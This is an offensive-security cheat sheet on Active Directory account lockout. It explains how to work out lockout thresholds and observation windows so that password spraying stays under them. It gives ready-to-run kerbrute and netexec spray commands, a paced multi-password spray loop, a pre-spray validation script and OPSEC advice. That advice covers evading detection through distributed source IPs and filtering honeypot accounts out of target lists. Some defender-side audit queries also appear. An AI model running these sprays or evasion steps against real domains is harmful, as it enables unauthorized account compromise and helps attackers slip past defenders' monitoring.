---
aliases:
  - Lockout Threshold
  - Spray Window
  - Bad Password Count
  - Account Lockout
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Password Policy Enumeration]]"
  - "[[HTTP Brute Forcing]]"
---
# AD - Password Policy Enumeration - Lockout & Brute Force Implications

***

## Lockout Mechanics

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Lockout threshold | Failed attempts before lock | Standard. |
| 0 = No lockout | Unlimited attempts | Critical vuln. |
| Common: 5-10 | Standard hardening | Standard. |
| Aggressive: 3 | High-security | Audit. |
| Lockout duration | Time locked | Standard. |
| 0 = Lock until manual unlock | Strictest | Edge. |
| Common: 30 min | Standard | Standard. |
| Lockout observation window | Counter reset window | Standard. |
| `badPwdCount` per-user counter | LDAP attr | Standard. |
| `lockoutTime` when locked | LDAP attr | Standard. |
| `lastLogon` doesn't reset count | Standard | Standard. |
| Successful logon resets badPwdCount | Standard | Standard. |
| Per-DC counter (replication delay) | Edge | Adjacent. |
| Bulk wrong attempts → lockout | Standard | Standard. |
| Detection: Event 4740 (account locked) | Defender | Adjacent. |
| Detection: Event 4625 (failed logon) | Defender | Adjacent. |
| Modern: lockout per-domain | Standard | Standard. |
^ad-lockout-mechanics

### Lockout state check

```powershell
# Check if user locked out
$user = Get-ADUser jsmith -Properties LockedOut,BadPwdCount,LastBadPasswordAttempt,LockoutTime
[PSCustomObject]@{
  User = $user.SamAccountName
  Locked = $user.LockedOut
  BadCount = $user.BadPwdCount
  LastBadAttempt = $user.LastBadPasswordAttempt
  LockoutTime = if ($user.LockoutTime -ne 0) { [datetime]::FromFileTime($user.LockoutTime) } else { "Not locked" }
}

# Bulk locked-out users
Get-ADUser -Filter {LockedOut -eq $true} -Properties LockedOut,BadPwdCount,LastBadPasswordAttempt
```

___

## Spray Window Calculation

| **Variable** | **Source** | **Notas** |
|:---:|:---:|:---:|
| Lockout threshold (LT) | Domain policy | Direct. |
| Lockout observation window (LOW) | Domain policy | Direct. |
| Safe spray attempts per user per LOW | LT - 1 (conservative) | Math. |
| Spray pacing | (LT-1 attempts per LOW) per user | Math. |
| Common: 5 LT, 30 min LOW | 4 attempts per 30 min per user | Standard. |
| Bad count resets after LOW | If no failures during window | Standard. |
| Aggressive spray: hit threshold | Lock account → Defender alert | Risk. |
| Stealth spray: way under threshold | 1 attempt per LOW | OPSEC. |
| Multiple users in same window | OK (per-user counter) | Standard. |
| Bulk users + slow per-user | Optimal balance | Strategy. |
| Reverse spray (1 pass × N users) | No per-user lockout triggered | OPSEC win. |
| `--continue-on-success` flag | Standard | Tool. |
| Pre-spray: check lockout via 1 fail | Confirm threshold | Standard. |
| Per-DC lockout counter | Replication delay 5-15min | Edge. |
| Race against replication | Theoretical | Edge. |
| Detection: bulk Event 4625 | Defender | Adjacent. |
^ad-lockout-spray

### Spray pacing calculator

```powershell
$pol = Get-ADDefaultDomainPasswordPolicy
$threshold = $pol.LockoutThreshold
$window = $pol.LockoutObservationWindow.TotalMinutes

if ($threshold -eq 0) {
  Write-Host "No lockout — spray freely (high detection risk)"
} else {
  $safeAttempts = $threshold - 1
  Write-Host "Safe spray: $safeAttempts attempts per user per $window minutes"
  Write-Host "Conservative: 1 attempt per user per $($window + 5) minutes"
}
```

```bash
# Manual calc (assume LT=5, LOW=30min)
# Safe: 4 attempts per 30 min per user
# Conservative: 1 attempt per 35 min per user
# Wait between rounds: 35 min
```

___

## Reverse Spray (1 Password × N Users)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| 1 password attempt per user | No per-user lockout triggered | OPSEC win. |
| Multi-user same password test | Bulk efficient | Strategy. |
| Common spray: 1 attempt → wait → next attempt | Pacing | Standard. |
| Common passwords: Spring2026!, CompanyName2024! | Pattern | Common. |
| Per-user limit not hit (single fail per user) | Standard | Standard. |
| Detection: bulk Event 4625 from single source IP | Defender ML | Modern. |
| Distributed source IPs evade per-IP detection | Adjacent | Edge. |
| Wait between passwords: full LOW | Conservative | Standard. |
| `kerbrute passwordspray` | Standard | Tool. |
| `nxc smb DC -u users.txt -p 'Password'` | netexec | Standard. |
| Lockout window critical | Don't exceed | OPSEC. |
| Account-level vs domain-level lockout | Standard | Standard. |
| Honeypot account lockout = alert | Defender plant | Detection. |
| Detection: same IP many failed user logons | SIEM | Adjacent. |
| Modern: lockout protection | Defender | Defense. |
| Audit: per-user badPwdCount monitoring | Defender | Adjacent. |
^ad-lockout-reversespray

### Reverse spray script

```bash
# kerbrute spray
kerbrute passwordspray --dc DC -d dom.local users.txt 'Spring2026!' -o results.txt

# netexec spray
nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success

# Multi-password sequential (with pacing)
PASSWORDS=("Spring2026!" "Summer2026!" "Welcome1!" "Password123!")
LOCKOUT_WINDOW=35  # minutes (LOW + buffer)

for pass in "${PASSWORDS[@]}"; do
  echo "=== Spraying: $pass ==="
  nxc smb DC -u users.txt -p "$pass" --continue-on-success
  echo "Sleeping $LOCKOUT_WINDOW min before next password..."
  sleep $((LOCKOUT_WINDOW * 60))
done
```

___

## Bad Password Count Tracking

| **Atributo** | **Significado** | **Notas** |
|:---:|:---:|:---:|
| `badPwdCount` | Failed attempts count | LDAP attr. |
| `badPasswordTime` | Last bad attempt | LDAP attr. |
| `lockoutTime` | When locked (0 = not locked) | LDAP attr. |
| Per-DC counter | Replication delay 5-15min | Edge. |
| `Get-ADUser -Properties BadPwdCount` | RSAT | Standard. |
| Bulk monitoring | Defender SIEM | Adjacent. |
| Reset on successful logon | Automatic | Standard. |
| Reset after LOW | Automatic | Standard. |
| Manual unlock by admin | `Unlock-ADAccount` | Standard. |
| Counter visible to authenticated read | Default | Permissive. |
| Audit: high badPwdCount = active brute | Detection | Standard. |
| Cross-DC counter sync | Replication | Adjacent. |
| `lockoutTime != 0` = locked | Direct check | Standard. |
| `LastLogon` reset distinct from BadPwdCount | Standard | Standard. |
| Honeypot account | Alert on ANY badPwdCount > 0 | Defender. |
| Detection threshold | Custom per-org | Defender. |
^ad-lockout-badcount

### Bad count audit

```powershell
# Users with active bad attempts (recent)
Get-ADUser -Filter * -Properties BadPwdCount,LastBadPasswordAttempt |
  Where {$_.BadPwdCount -gt 0} |
  Select Name,SamAccountName,BadPwdCount,LastBadPasswordAttempt |
  Sort BadPwdCount -Descending

# Currently locked
Get-ADUser -Filter {LockedOut -eq $true} -Properties LockedOut,LockoutTime |
  Select Name,@{n='LockedAt';e={[datetime]::FromFileTime($_.LockoutTime)}}

# Spray detection: many users with badPwdCount > 0 in last hour
$hour = (Get-Date).AddHours(-1)
Get-ADUser -Filter * -Properties BadPwdCount,LastBadPasswordAttempt |
  Where {$_.BadPwdCount -gt 0 -and $_.LastBadPasswordAttempt -gt $hour}
```

___

## Pre-Spray Validation

| **Step** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Confirm lockout policy | `nxc smb DC -u u -p p --pass-pol` | Foundation. |
| Test single user 1 wrong | Validate threshold | Pre-spray. |
| Validate user list (kerbrute userenum) | No lockout via enum | Pre-spray. |
| Identify priv users (filter list) | Prioritize | Strategy. |
| Identify exclusions (honeypots) | Risk avoidance | OPSEC. |
| Spray dry-run | Single user with bad pwd | Validate flow. |
| Check via observation | `Get-ADUser ... BadPwdCount` | Validate. |
| Calculate pacing | Conservative | Math. |
| Identify spray window edge | Wait full LOW | Standard. |
| Plan multi-password rotation | Schedule | Strategy. |
| Test against single non-priv user | Initial validation | Pre-spray. |
| Monitor lockouts during spray | Risk control | OPSEC. |
| Stop on lockout detection | Halt | OPSEC. |
| Cross-correlate domain functional level | Edge features | Adjacent. |
| Forest-wide spray | Per-domain pacing | Strategy. |
| Document pacing decisions | Compliance | Standard. |
^ad-lockout-prespray

### Pre-spray validation script

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"

# 1. Confirm policy
nxc smb $DC -u $USER -p $PASS --pass-pol

# 2. Validate username list
kerbrute userenum --dc $DC -d dom.local users.txt -o valid_users.txt
echo "Valid users: $(wc -l < valid_users.txt)"

# 3. Spray test (1 password, single attempt)
echo "TestUser1" > test_user.txt
nxc smb $DC -u test_user.txt -p 'WrongPassword!' --continue-on-success

# 4. Verify policy enforced (BadPwdCount went up)
nxc ldap $DC -u $USER -p $PASS --query "(samAccountName=TestUser1)" "badPwdCount,lockoutTime"

# 5. Plan pacing (35 min wait between rounds for LT=5 LOW=30min)
```

___

## Honeypot Account Detection

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Honeypot accounts | Defender plants — unused, alert on access | Defender. |
| Naming patterns: admin01, dbadmin, backup_admin | Common bait | Audit. |
| Created but never logged in | LastLogonDate null | Detection. |
| Not in any priv group despite name | Pattern | Detection. |
| AD honeypot tools (HoneyLDAP, Canary tokens) | Detection products | Defender. |
| Bulk recent creation in priv-named accounts | Anomaly | Detection. |
| Audit: any badPwdCount = alert | Defender | Defender. |
| Spray hit on honeypot = burns op | OPSEC failure | Risk. |
| Detection: filter honeypots from spray list | Manual | OPSEC. |
| LinkedIn validation (honeypots have no real person) | Validation | OPSEC. |
| GitHub presence | Real users have profiles | Indirect. |
| Mailbox usage check | Adjacent | Edge. |
| Description hints "test", "demo", "honey" | Common | OSINT. |
| Created by `domain admin` user (suspicious) | Anomaly | Detection. |
| `whenCreated` recent + privileged name | Detection signal | Defender. |
| Cross-correlate: priv name + no logon = honeypot | Strong indicator | OPSEC. |
^ad-lockout-honeypot

### Honeypot detection (defender side)

```powershell
# Honeypot candidates: privileged-sounding name, never logged in
Get-ADUser -Filter * -Properties LastLogonDate,whenCreated,Description |
  Where {
    -not $_.LastLogonDate -and
    ($_.SamAccountName -match "admin|dba|root|backup|svc")
  } |
  Select Name,SamAccountName,whenCreated,Description
```

```bash
# OPSEC: filter probable honeypots from spray list
cat valid_users.txt | grep -vE '^(admin|administrator|test|honey|canary|trap)' > spray_users.txt
```

___

## Per-User Lockout Variations

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Default Domain Policy applies to all | Standard | Standard. |
| PSO override per user/group | Granular | Standard. |
| Stricter PSO on Tier 0 | Best practice | Standard. |
| Laxer PSO on service accounts | Common audit finding | Audit. |
| `Get-ADUserResultantPasswordPolicy` | Per-user effective | Standard. |
| Per-user lockout threshold via PSO | Direct | Standard. |
| Service account no lockout (PSO) | Common misconfig | Critical. |
| Spray strategy: target users with PSO laxness | Strategic | Strategy. |
| Cross-correlate: privileged + lax PSO | Critical | Audit. |
| Audit: every Tier 0 user has strict PSO | Compliance | Standard. |
| Detection: PSO disable lockout event | Defender | Adjacent. |
| `lockoutThreshold=0` per-PSO | Direct vuln | Critical. |
| `LockoutDuration=0` (unlimited lockout) | Strictest | Edge. |
| BloodHound PSO awareness | Modern | Tool. |
| Per-user PSO precedence | Standard | Standard. |
| Hidden PSOs via ACL deny | Edge | Detection. |
^ad-lockout-peruser

### Per-user lockout variation audit

```powershell
# All users + their effective lockout
Get-ADUser -Filter * -Properties SamAccountName | ForEach-Object {
  $u = $_
  $pol = Get-ADUserResultantPasswordPolicy -Identity $u -ErrorAction SilentlyContinue
  if ($pol -and $pol.LockoutThreshold -ne $null) {
    [PSCustomObject]@{
      User = $u.SamAccountName
      AppliedPSO = $pol.Name
      LockoutThreshold = $pol.LockoutThreshold
      Risk = if ($pol.LockoutThreshold -eq 0) {"NO_LOCKOUT"} 
             elseif ($pol.LockoutThreshold -gt 50) {"HIGH"}
             else {"OK"}
    }
  }
} | Where Risk -ne "OK"
```

***
